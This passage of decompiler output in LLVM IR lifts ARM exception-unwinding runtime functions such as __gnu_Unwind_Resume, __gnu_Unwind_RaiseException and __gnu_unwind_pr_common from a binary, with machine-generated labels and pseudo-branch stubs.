; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_19768, { 1, 0 }
  uselistorder label %dec_label_pc_19764, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19734, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_19770 = add i32 %ucbp, 20
  %v2_19770 = inttoptr i32 %v1_19770 to i32*
  %v3_19770 = load i32, i32* %v2_19770, align 4
  %v1_19778 = load i32, i32* %r1.global-to-local, align 4
  %v2_19778 = add i32 %v1_19778, 64
  %v3_19778 = inttoptr i32 %v2_19778 to i32*
  store i32 %v3_19770, i32* %v3_19778, align 4
  %v1_1977c = add i32 %ucbp, 12
  %v2_1977c = inttoptr i32 %v1_1977c to i32*
  %v3_1977c = load i32, i32* %v2_1977c, align 4
  %v2_19780 = icmp eq i32 %v3_1977c, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_1978c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1978c, i32* @r5, align 4
  br i1 %v2_19780, label %dec_label_pc_19794, label %dec_label_pc_197d0

dec_label_pc_19794:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_197a0 = add i32 %ucbp, 16
  %v2_197a0 = inttoptr i32 %v1_197a0 to i32*
  %v3_197a0 = load i32, i32* %v2_197a0, align 4
  call void @__pseudo_branch(i32 %v3_197a0)
  br i1 false, label %dec_label_pc_197c8, label %dec_label_pc_197b4

dec_label_pc_197b4:                               ; preds = %dec_label_pc_19794
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_14580.556 to i32))
  %v0_197bc = load i32, i32* @r4, align 4
  %v0_197c0 = load i32, i32* @r5, align 4
  store i32 %v0_197c0, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_197bc, i32 %v0_197c0)
  br label %dec_label_pc_197c8

dec_label_pc_197c8:                               ; preds = %dec_label_pc_19794, %dec_label_pc_197b4
  %v0_197c8 = load i32, i32* @r5, align 4
  %v1_197c8 = add i32 %v0_197c8, 4
  %v1_197cc = inttoptr i32 %v1_197c8 to i32*
  %v2_197cc = call i32 @__restore_core_regs(i32* %v1_197cc)
  %v1_197d4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_197d0

dec_label_pc_197d0:                               ; preds = %entry, %dec_label_pc_197c8
  %v1_197d4 = phi i32 [ %v0_1978c, %entry ], [ %v1_197d4.pre, %dec_label_pc_197c8 ]
  %v3_197d4 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_197d4, i32 1)
  %v0_197d8 = call i32 @abort()
  ret i32 %v0_197d8

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 1, 5, 4, 3, 2, 9, 8, 10, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 44, 45, 46, 47, 48, 50, 22, 19, 20, 21, 15, 16, 17, 23, 24, 18, 6, 7, 8, 9, 10, 11, 12, 13, 14, 31, 55, 59, 58, 57, 51, 52, 2, 39, 40, 41, 42, 43, 53, 54, 56, 34, 35, 49, 32, 36, 33, 0, 25, 26, 1, 27, 28, 29, 30, 37, 38, 3, 4, 5 }
  uselistorder i1 true, { 0, 1, 2, 3, 349, 608, 4, 609, 610, 611, 612, 5, 328, 365, 613, 6, 327, 614, 7, 326, 615, 616, 617, 618, 8, 619, 366, 9, 330, 620, 10, 329, 621, 622, 11, 623, 624, 625, 12, 626, 627, 13, 628, 14, 368, 629, 630, 367, 631, 632, 15, 331, 16, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 18, 333, 19, 643, 644, 645, 20, 332, 646, 21, 17, 647, 648, 22, 649, 650, 651, 23, 652, 653, 654, 655, 656, 24, 25, 369, 26, 27, 28, 29, 607, 334, 657, 658, 335, 659, 371, 660, 661, 31, 662, 663, 32, 336, 665, 30, 666, 664, 667, 370, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 338, 44, 45, 46, 47, 48, 351, 673, 686, 325, 339, 354, 353, 668, 374, 669, 670, 160, 163, 671, 672, 337, 352, 674, 675, 676, 340, 677, 678, 679, 164, 165, 680, 681, 682, 683, 161, 162, 684, 685, 373, 372, 166, 167, 168, 687, 169, 170, 355, 356, 361, 357, 362, 358, 360, 688, 359, 364, 689, 171, 690, 159, 691, 375, 376, 692, 377, 378, 172, 693, 379, 380, 173, 174, 694, 381, 382, 175, 176, 695, 177, 178, 179, 696, 383, 384, 180, 181, 697, 385, 386, 182, 698, 387, 388, 156, 157, 158, 699, 389, 390, 155, 700, 391, 392, 701, 341, 342, 183, 184, 702, 393, 394, 185, 703, 186, 187, 704, 188, 189, 705, 190, 191, 706, 192, 324, 154, 193, 194, 707, 395, 396, 195, 196, 708, 197, 198, 709, 397, 398, 151, 152, 153, 150, 710, 399, 400, 711, 401, 402, 147, 148, 149, 712, 403, 404, 713, 405, 406, 144, 145, 146, 714, 407, 408, 715, 409, 410, 141, 142, 143, 716, 411, 412, 138, 139, 140, 717, 413, 414, 718, 415, 416, 135, 136, 137, 719, 417, 418, 199, 720, 419, 420, 132, 133, 134, 721, 421, 422, 722, 423, 424, 129, 130, 131, 723, 425, 426, 724, 427, 428, 126, 127, 128, 725, 429, 430, 726, 431, 432, 123, 124, 125, 727, 433, 434, 121, 122, 728, 435, 436, 120, 729, 437, 438, 730, 439, 440, 200, 201, 202, 731, 441, 442, 117, 118, 119, 732, 443, 444, 733, 445, 446, 114, 115, 116, 734, 447, 448, 112, 113, 735, 449, 450, 736, 451, 452, 737, 453, 454, 738, 455, 456, 739, 457, 458, 740, 459, 460, 741, 461, 462, 742, 463, 464, 743, 465, 466, 744, 467, 468, 203, 204, 205, 745, 469, 470, 109, 110, 111, 746, 471, 472, 747, 473, 474, 106, 107, 108, 748, 475, 476, 103, 104, 105, 749, 477, 478, 100, 101, 102, 99, 750, 479, 480, 751, 481, 482, 96, 97, 98, 752, 483, 484, 753, 485, 486, 93, 94, 95, 754, 487, 488, 755, 489, 490, 206, 207, 208, 756, 491, 492, 209, 210, 211, 757, 493, 494, 212, 213, 214, 758, 495, 496, 90, 91, 92, 759, 497, 498, 760, 499, 500, 88, 89, 761, 501, 502, 762, 503, 504, 87, 763, 764, 505, 506, 215, 216, 765, 507, 508, 84, 85, 86, 766, 509, 510, 83, 767, 768, 511, 512, 81, 82, 769, 513, 514, 770, 515, 516, 78, 79, 80, 771, 517, 518, 217, 218, 219, 772, 519, 520, 75, 76, 77, 773, 521, 522, 774, 523, 524, 74, 775, 776, 525, 526, 72, 73, 777, 527, 528, 70, 71, 778, 529, 530, 779, 531, 532, 67, 68, 69, 780, 533, 534, 66, 781, 220, 782, 535, 536, 63, 64, 65, 783, 537, 538, 784, 539, 540, 60, 61, 62, 785, 541, 542, 786, 543, 544, 787, 545, 546, 59, 788, 789, 547, 548, 221, 222, 223, 57, 58, 790, 549, 550, 791, 551, 552, 792, 553, 554, 793, 555, 556, 794, 557, 558, 795, 559, 560, 796, 561, 562, 224, 797, 225, 226, 56, 798, 563, 564, 227, 799, 228, 229, 230, 800, 231, 232, 233, 801, 234, 235, 236, 237, 802, 238, 239, 240, 241, 803, 242, 243, 804, 565, 566, 244, 245, 805, 246, 247, 248, 806, 249, 250, 251, 807, 252, 253, 254, 808, 255, 256, 257, 809, 258, 259, 260, 261, 810, 567, 568, 262, 263, 811, 264, 265, 266, 812, 267, 268, 813, 269, 270, 271, 814, 272, 273, 274, 815, 275, 276, 277, 278, 279, 280, 281, 816, 282, 283, 284, 817, 569, 570, 285, 55, 818, 571, 572, 286, 287, 54, 819, 343, 344, 820, 288, 821, 289, 290, 291, 822, 292, 293, 294, 823, 573, 574, 295, 53, 824, 575, 576, 296, 297, 52, 825, 577, 578, 51, 826, 579, 580, 298, 299, 300, 827, 581, 582, 301, 828, 583, 584, 302, 50, 829, 585, 586, 303, 304, 305, 830, 306, 307, 308, 831, 309, 310, 49, 832, 345, 346, 311, 312, 313, 314, 315, 833, 587, 588, 834, 589, 590, 835, 591, 592, 836, 593, 594, 837, 595, 596, 838, 597, 598, 839, 599, 600, 840, 601, 602, 841, 603, 604, 842, 605, 606, 350, 843, 363, 844, 316, 347, 317, 318, 348, 319, 320, 321, 322, 323 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_197d0, { 1, 0 }
  uselistorder label %dec_label_pc_197c8, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_197dc = load i32, i32* @r4, align 4
  store i32 %v3_197dc, i32* %stack_var_-16, align 4
  %v6_197dc = load i32, i32* @r5, align 4
  %v9_197dc = load i32, i32* @r6, align 4
  %v12_197dc = load i32, i32* @lr, align 4
  %v1_197e0 = add i32 %entry_vrs, 60
  %v2_197e0 = inttoptr i32 %v1_197e0 to i32*
  %v3_197e0 = load i32, i32* %v2_197e0, align 4
  %v2_197e4 = add i32 %entry_vrs, 64
  %v3_197e4 = inttoptr i32 %v2_197e4 to i32*
  store i32 %v3_197e0, i32* %v3_197e4, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_19814 = load i32, i32* %v3_197e4, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_1982c = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_19814)
  %v2_19830 = icmp eq i32 %v2_1982c, 0
  br i1 %v2_19830, label %dec_label_pc_19838, label %dec_label_pc_1986c

dec_label_pc_19838:                               ; preds = %entry
  %v0_19838 = load i32, i32* @r5, align 4
  %v1_19840 = add i32 %v0_19838, 16
  %v2_19840 = inttoptr i32 %v1_19840 to i32*
  %v3_19840 = load i32, i32* %v2_19840, align 4
  call void @__pseudo_branch(i32 %v3_19840)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_19858 = load i32, i32* %saved_vrs_-320, align 4
  %v1_1985c = urem i32 %v2_19858, 2
  %v2_1985c = icmp eq i32 %v1_1985c, 0
  br i1 %v2_1985c, label %dec_label_pc_1987c, label %dec_label_pc_19864

dec_label_pc_19864:                               ; preds = %dec_label_pc_19838, %dec_label_pc_1987c
  %v0_19864 = phi i1 [ false, %dec_label_pc_19838 ], [ %phitmp, %dec_label_pc_1987c ]
  br i1 %v0_19864, label %dec_label_pc_19888, label %dec_label_pc_1986c

dec_label_pc_1986c:                               ; preds = %entry, %dec_label_pc_19864
  %v2_19874 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19874, i32* @r4, align 4
  store i32 %v6_197dc, i32* @r5, align 4
  store i32 %v9_197dc, i32* @r6, align 4
  store i32 %v12_197dc, i32* @lr, align 4
  ret i32 9

dec_label_pc_1987c:                               ; preds = %dec_label_pc_19838
  %v2_1987c = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_1987c, i32* @r0, align 4
  %v1_19880 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_1987c)
  %v0_19864.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_19864.pre, 6
  br label %dec_label_pc_19864

dec_label_pc_19888:                               ; preds = %dec_label_pc_19864
  %v0_19888 = load i32, i32* @r5, align 4
  %v0_1988c = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_19888, i32 %v0_1988c)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1986c, { 1, 0 }
  uselistorder label %dec_label_pc_19864, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_19894 = add i32 %ucbp, 12
  %v2_19894 = inttoptr i32 %v1_19894 to i32*
  %v3_19894 = load i32, i32* %v2_19894, align 4
  %v2_19898 = icmp eq i32 %v3_19894, 0
  br i1 %v2_19898, label %dec_label_pc_198a0, label %dec_label_pc_198a4

dec_label_pc_198a0:                               ; preds = %entry
  %v2_198a0 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_198a4

dec_label_pc_198a4:                               ; preds = %entry, %dec_label_pc_198a0
  %v1_198a4 = add i32 %entry_vrs, 60
  %v2_198a4 = inttoptr i32 %v1_198a4 to i32*
  %v3_198a4 = load i32, i32* %v2_198a4, align 4
  %v2_198ac = add i32 %entry_vrs, 64
  %v3_198ac = inttoptr i32 %v2_198ac to i32*
  store i32 %v3_198a4, i32* %v3_198ac, align 4
  %v3_198b0 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_198b0

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_198a4, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_19910

bb:                                               ; preds = %entry
  %v7_198c8 = mul i32 %regclass, 4
  %v8_198c8 = add i32 %v7_198c8, ptrtoint (i32* @global_var_198d0.709 to i32)
  call void @__pseudo_branch(i32 %v8_198c8)
  br label %dec_label_pc_19910

dec_label_pc_19910:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_199f8 = load i32, i32* @r4, align 4
  %v6_199f8 = load i32, i32* @r5, align 4
  %v2_19a08 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_19a10 = add i32 %ucbp, 76
  %v2_19a10 = inttoptr i32 %v1_19a10 to i32*
  %v3_19a10 = load i32, i32* %v2_19a10, align 4
  %v1_19a1c = inttoptr i32 %v3_19a10 to i32*
  %v2_19a1c = load i32, i32* %v1_19a1c, align 4
  store i32 %v2_19a1c, i32* @lr, align 4
  %v4_19a1c = add i32 %v3_19a10, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_19a28 = urem i32 %state, 4
  store i32 %v1_19a28, i32* %r2.global-to-local, align 4
  %v1_19a2c = and i32 %state, 8
  store i32 %v1_19a2c, i32* %r0.global-to-local, align 4
  %v4_19a3c = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_19a1c, i32* %v4_19a3c, align 8
  br i1 %v2_19a08, label %dec_label_pc_19a4c, label %dec_label_pc_19d28

dec_label_pc_19a4c:                               ; preds = %entry
  %v3_19a4c = mul i32 %v2_19a1c, 256
  store i32 %v3_19a4c, i32* %v4_19a3c, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19a64

dec_label_pc_19a64:                               ; preds = %dec_label_pc_19d28, %dec_label_pc_19a4c
  %v0_19a88647090 = phi i32 [ %v2_19d40, %dec_label_pc_19d28 ], [ %v4_19a1c, %dec_label_pc_19a4c ]
  store i32 %v1_19a28, i32* %r2.global-to-local, align 4
  %v1_19a68 = add i32 %ucbp, 80
  %v2_19a68 = inttoptr i32 %v1_19a68 to i32*
  %v3_19a68 = load i32, i32* %v2_19a68, align 4
  %v7_19a6c = icmp eq i32 %v1_19a28, 2
  br i1 %v7_19a6c, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_19a64
  %v2_19a70 = add i32 %ucbp, 56
  %v3_19a70 = inttoptr i32 %v2_19a70 to i32*
  %v4_19a70 = load i32, i32* %v3_19a70, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_19a64, %bb
  %v0_19a886470 = phi i32 [ %v0_19a88647090, %dec_label_pc_19a64 ], [ %v4_19a70, %bb ]
  %v1_19a74 = urem i32 %v3_19a68, 2
  %v2_19a74 = icmp eq i32 %v1_19a74, 0
  br i1 %v2_19a74, label %dec_label_pc_19a88.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_19b48

dec_label_pc_19a88.preheader:                     ; preds = %bb148
  %v1_19a886571 = inttoptr i32 %v0_19a886470 to i32*
  %v2_19a886672 = load i32, i32* %v1_19a886571, align 4
  %v2_19a8c6874 = icmp eq i32 %v2_19a886672, 0
  br i1 %v2_19a8c6874, label %dec_label_pc_19b48, label %dec_label_pc_19a94.preheader.lr.ph.lr.ph

dec_label_pc_19a94.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_19a88.preheader
  %v7_19a98 = icmp eq i32 %id, 2
  %v2_19b24 = icmp eq i32 %v1_19a28, 0
  %v2_19cf0 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_19c0c = icmp eq i32 %v1_19a2c, 0
  br label %dec_label_pc_19a94.preheader.lr.ph

dec_label_pc_19a94.preheader.lr.ph:               ; preds = %dec_label_pc_19a94.preheader.lr.ph.lr.ph, %dec_label_pc_19d5c
  %v1_19aa496 = phi i32 [ %v2_19a886672, %dec_label_pc_19a94.preheader.lr.ph.lr.ph ], [ %v2_19a8866, %dec_label_pc_19d5c ]
  %v1_19aa093 = phi i32 [ %v0_19a886470, %dec_label_pc_19a94.preheader.lr.ph.lr.ph ], [ %v2_19d60, %dec_label_pc_19d5c ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_19a94.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_19d5c ]
  br label %dec_label_pc_19a94.preheader

dec_label_pc_19a94.preheader:                     ; preds = %dec_label_pc_19a94.preheader.lr.ph, %dec_label_pc_19d20
  %v1_19aa495 = phi i32 [ %v1_19aa496, %dec_label_pc_19a94.preheader.lr.ph ], [ %v2_19a88, %dec_label_pc_19d20 ]
  %v1_19aa092 = phi i32 [ %v1_19aa093, %dec_label_pc_19a94.preheader.lr.ph ], [ %v1_19d20, %dec_label_pc_19d20 ]
  br label %dec_label_pc_19a94

dec_label_pc_19a94:                               ; preds = %dec_label_pc_19a94.preheader, %dec_label_pc_19b38
  %v1_19aa4 = phi i32 [ %v1_19aa495, %dec_label_pc_19a94.preheader ], [ %v2_19b3c, %dec_label_pc_19b38 ]
  %v1_19ab8 = phi i32 [ %v1_19aa092, %dec_label_pc_19a94.preheader ], [ %v1_19b38, %dec_label_pc_19b38 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_19a98, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_19a94
  %v2_19a9c = add i32 %v1_19ab8, 4
  %v3_19a9c = inttoptr i32 %v2_19a9c to i32*
  %v4_19a9c = load i32, i32* %v3_19a9c, align 4
  store i32 %v4_19a9c, i32* @r5, align 4
  store i32 %v1_19aa4, i32* @r6, align 4
  %v0_19aa8109 = load i32, i32* @r8, align 4
  %v1_19aa8110 = add i32 %v0_19aa8109, 72
  %v2_19aa8111 = inttoptr i32 %v1_19aa8110 to i32*
  %v3_19aa8112 = load i32, i32* %v2_19aa8111, align 4
  store i32 %v3_19aa8112, i32* @lr, align 4
  %v2_19ab4 = add i32 %v1_19ab8, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_19a94
  %v2_19aa0 = add i32 %v1_19ab8, 2
  %v3_19aa0 = inttoptr i32 %v2_19aa0 to i16*
  %v4_19aa0 = load i16, i16* %v3_19aa0, align 2
  %v5_19aa0 = zext i16 %v4_19aa0 to i32
  store i32 %v5_19aa0, i32* @r5, align 4
  %v0_19aa8 = load i32, i32* @r8, align 4
  %v1_19aa8 = add i32 %v0_19aa8, 72
  %v2_19aa8 = inttoptr i32 %v1_19aa8 to i32*
  %v3_19aa8 = load i32, i32* %v2_19aa8, align 4
  store i32 %v3_19aa8, i32* @lr, align 4
  %v2_19ab0 = inttoptr i32 %v1_19ab8 to i16*
  %v3_19ab0 = load i16, i16* %v2_19ab0, align 2
  %v4_19ab0 = zext i16 %v3_19ab0 to i32
  store i32 %v4_19ab0, i32* @r6, align 4
  %v2_19ab8 = add i32 %v1_19ab8, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_19ab8, %.thread16 ], [ %v2_19ab4, %bb151 ]
  %v3_19aa8115 = phi i32 [ %v3_19aa8, %.thread16 ], [ %v3_19aa8112, %bb151 ]
  %v0_19ac0113 = phi i32 [ %v5_19aa0, %.thread16 ], [ %v4_19a9c, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_19ac0 = and i32 %v0_19ac0113, -2
  %v2_19ac4 = add i32 %v1_19ac0, %v3_19aa8115
  store i32 %v2_19ac4, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_19ad4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19ad4, i32* %r0.global-to-local, align 4
  %v5_19ae0 = call i32 @_Unwind_VRS_Get(i32 %v0_19ad4, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19ae0, i32* %r0.global-to-local, align 4
  %v3_19ae4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_19ae4, i32* %r2.global-to-local, align 4
  %v0_19ae8 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_19ae8, %v3_19ae4
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_19af4

._crit_edge:                                      ; preds = %bb152
  %v0_19b0c.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_19af4:                               ; preds = %bb152
  %v0_19af4 = load i32, i32* @r6, align 4
  %v1_19af4 = and i32 %v0_19af4, -2
  %v2_19af8 = add i32 %v1_19af4, %v0_19ae8
  %v3_19afc = icmp ult i32 %v3_19ae4, %v2_19af8
  br i1 %v3_19afc, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_19af4
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_19af4
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_19b0c = phi i32 [ %v0_19b0c.pre, %._crit_edge ], [ %v0_19af4, %bb153 ], [ %v0_19af4, %.thread20 ]
  %v0_19cb4 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_19b08 = load i32, i32* @r5, align 4
  %v1_19b0c = urem i32 %v0_19b0c, 2
  %v1_19b08 = mul i32 %v0_19b08, 2
  %v3_19b10 = and i32 %v1_19b08, 2
  %v4_19b10 = or i32 %v3_19b10, %v1_19b0c
  store i32 %v4_19b10, i32* %r2.global-to-local, align 4
  %v7_19b14 = icmp eq i32 %v4_19b10, 1
  br i1 %v7_19b14, label %dec_label_pc_19ca8, label %dec_label_pc_19b1c

dec_label_pc_19b1c:                               ; preds = %bb154
  %v2_19b14 = icmp eq i32 %v4_19b10, 0
  br i1 %v2_19b14, label %dec_label_pc_19b20, label %dec_label_pc_19bd0

dec_label_pc_19b20:                               ; preds = %dec_label_pc_19b1c
  store i32 %v1_19a28, i32* %r2.global-to-local, align 4
  br i1 %v2_19b24, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_19b20
  %v0_19b38119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_19b38

bb155:                                            ; preds = %dec_label_pc_19b20
  %v2_19b30 = icmp eq i32 %v0_19cb4, 0
  %v0_19b38 = load i32, i32* @r7, align 4
  br i1 %v2_19b30, label %dec_label_pc_19b38, label %dec_label_pc_19eb0

dec_label_pc_19b38:                               ; preds = %.thread, %bb155
  %v0_19b38120 = phi i32 [ %v0_19b38119, %.thread ], [ %v0_19b38, %bb155 ]
  %v1_19b38 = add i32 %v0_19b38120, 4
  %v1_19b3c = inttoptr i32 %v1_19b38 to i32*
  %v2_19b3c = load i32, i32* %v1_19b3c, align 4
  %v2_19b40 = icmp eq i32 %v2_19b3c, 0
  br i1 %v2_19b40, label %dec_label_pc_19b48, label %dec_label_pc_19a94

dec_label_pc_19b48:                               ; preds = %dec_label_pc_19d5c, %dec_label_pc_19d20, %dec_label_pc_19b38, %dec_label_pc_19a88.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_19a88.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19b38 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19d20 ], [ %stack_var_-76.4, %dec_label_pc_19d5c ]
  %v0_19b48 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19b48, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_19b50 = call i32 @__gnu_unwind_execute(i32 %v0_19b48, %anon_struct_13* %tmp156)
  store i32 %v4_19b50, i32* %r0.global-to-local, align 4
  store i32 %v4_19b50, i32* %r5.global-to-local, align 4
  %v2_19b54 = icmp eq i32 %v4_19b50, 0
  br i1 %v2_19b54, label %dec_label_pc_19b5c, label %dec_label_pc_19bd8

dec_label_pc_19b5c:                               ; preds = %dec_label_pc_19b48
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_19b60 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_19b60, label %bb157, label %dec_label_pc_19b6c

bb157:                                            ; preds = %dec_label_pc_19b5c
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19bdc

dec_label_pc_19b6c:                               ; preds = %dec_label_pc_19b5c
  %v2_19b6c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_19b6c, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_19b7c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19b7c, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_19b84 = call i32 @_Unwind_VRS_Get(i32 %v0_19b7c, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_19b88 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_19b7c, i32* %r0.global-to-local, align 4
  %v5_19b9c = call i32 @_Unwind_VRS_Set(i32 %v0_19b7c, i32 %v0_19b88, i32 14, i32 %v0_19b88, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19b9c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r2.global-to-local, align 4
  %v4_19ba8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 32) to i32*), align 4
  %v0_19bac = load i32, i32* %r5.global-to-local, align 4
  %v0_19bb0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19bb0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_19ba8, i32* %stack_var_-48, align 4
  %v5_19bc4 = call i32 @_Unwind_VRS_Set(i32 %v0_19bb0, i32 %v0_19bac, i32 15, i32 %v0_19bac, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19bdc

dec_label_pc_19bd0:                               ; preds = %dec_label_pc_19b1c
  %v7_19bd0 = icmp eq i32 %v4_19b10, 2
  br i1 %v7_19bd0, label %dec_label_pc_19be8, label %dec_label_pc_19bd8

dec_label_pc_19bd8:                               ; preds = %dec_label_pc_19bd0, %dec_label_pc_19cbc, %dec_label_pc_19b48, %dec_label_pc_19eb0
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19bdc

dec_label_pc_19bdc:                               ; preds = %bb157, %dec_label_pc_19ee8, %dec_label_pc_19e78, %bb166, %dec_label_pc_19b6c, %dec_label_pc_19bd8
  %v1_19be4 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_19ee8 ], [ %v1_19be4.pre, %dec_label_pc_19e78 ], [ 7, %bb166 ], [ 7, %dec_label_pc_19b6c ], [ 9, %dec_label_pc_19bd8 ]
  store i32 %v3_199f8, i32* %r4.global-to-local, align 4
  store i32 %v6_199f8, i32* %r5.global-to-local, align 4
  ret i32 %v1_19be4

dec_label_pc_19be8:                               ; preds = %dec_label_pc_19bd0
  store i32 %v1_19a28, i32* %r2.global-to-local, align 4
  %v0_19bec = load i32, i32* @r7, align 4
  %v1_19bec = inttoptr i32 %v0_19bec to i32*
  %v2_19bec = load i32, i32* %v1_19bec, align 4
  %tmp206 = bitcast i32 %v2_19bec to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_19bf4 = bitcast float %tmp207 to i32
